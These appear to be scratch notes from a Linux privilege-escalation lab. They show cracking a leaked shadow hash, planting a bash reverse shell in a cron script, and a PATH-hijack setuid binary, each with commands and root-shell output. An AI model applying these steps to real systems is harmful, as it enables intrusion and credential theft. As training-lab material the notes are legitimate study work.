if (!defined('DB_NAME'))
    define('DB_NAME', 'wordpress');
if (!defined('DB_USER'))
    define('DB_USER', 'wordpress');


## blog

http://security-lab/blog/

edited readme.html

```
lab_student@lab:/usr/share/wordpress$ vim readme.html 

```


http://security-lab/blog/wp-login.php

username: wordpress
password: wordpress



Found backup file

```bash

lab_student@lab:/var/backups$ cat safety_backup 
# Saving my entry of the /etc/shadow file. Just in case a hacker modifies it!!!

lab_prof:$6$2ovzYOy.y4KiJju8$tgrxr.dpK20mRYpmD.SvyFIJPwYwA/ogXnPGQjgB2nNM2gmQYneVoegDaLriFwefGFoxxsHXnpSSapVxNTlFt0:18728:0:99999:7:::


```

- cracking the hash with john
```bash
unshadow pass shad  > crack.db
```

```bash
┌──(shashi@kali)-[~/linux-priv-esc]
└─$ john crack.db 
```

```bash
└─$ john --show crack.db                                                                                    1 ⨯
lab_prof:sapphire:1002:1003:,,,:/home/lab_prof:/bin/bash

1 password hash cracked, 0 left
```


```
define('DB_PASSWORD', 'goodluckhackingme');
define('DB_USER', 'wordpress');
define('DB_PASSWORD', 'goodluckhackingme');
define('DB_USER', 'wordpress');
define('DB_PASSWORD', 'goodluckhackingme');
define('DB_USER', 'wordpress');
```

$P$BPeXrsqn77hNby2ZjcRHfk3VnTCyhL/$P$BPeXrsqn77hNby2ZjcRHfk3VnTCyhL/

wordpress password - admin
username- admin


```
wpscan --url http:
```


Cronjob found and added reverse shell
`bash -i >& /dev/tcp/192.168.37.128/4242 0>&1`

```bash
lab_prof@lab:~$ cat .save_student_grades 
#!/bin/bash

echo "All students failed" >> /tmp/secret_grades
bash -i >& /dev/tcp/192.168.37.128/4242 0>&1

```

__Result__

```bash
└─$ nc -lvnp 4242     
listening on [any] 4242 ...
connect to [192.168.37.128] from (UNKNOWN) [192.168.37.130] 53106
bash: cannot set terminal process group (1319): Inappropriate ioctl for device
bash: no job control in this shell
root@lab:~# id
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
root@lab:~# 
```



### exploiting teacher

touch.c contains
```bash
int main(){
        setuid(0);
        system("/bin/bash -p");
}
```
compile and transfer touch to lab_teachers home directory
- then set path
```bash

chmod +x touch
PATH=.:$PATH /lab/monitor_students

```

- execute `./monitor_students`
__Result__
```bash
./moitor_students
/bin/bash: line 6: ./moitor_students: No such file or directory
./monitor_students
Starting the monitoring of the lab students.
	[WARNING] Detected several students who are cheating. Writing report to file.
Ending the monitoring process.
id
uid=0(root) gid=1002(lab_teacher) groups=1002(lab_teacher),1001(teacher)
```